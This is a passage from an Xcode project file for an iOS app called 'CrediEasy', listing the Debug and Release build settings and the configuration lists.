				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		73E394552E6FB541008BDDC1 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		73E394392E6FB540008BDDC1 /* Build configuration list for PBXProject "CrediEasy" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				73E394542E6FB541008BDDC1 /* Debug */,
				73E394552E6FB541008BDDC1 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		73E394512E6FB541008BDDC1 /* Build configuration list for PBXNativeTarget "CrediEasy" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				73E394522E6FB541008BDDC1 /* Debug */,
				73E394532E6FB541008BDDC1 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 73E394362E6FB540008BDDC1 /* Project object */;
}
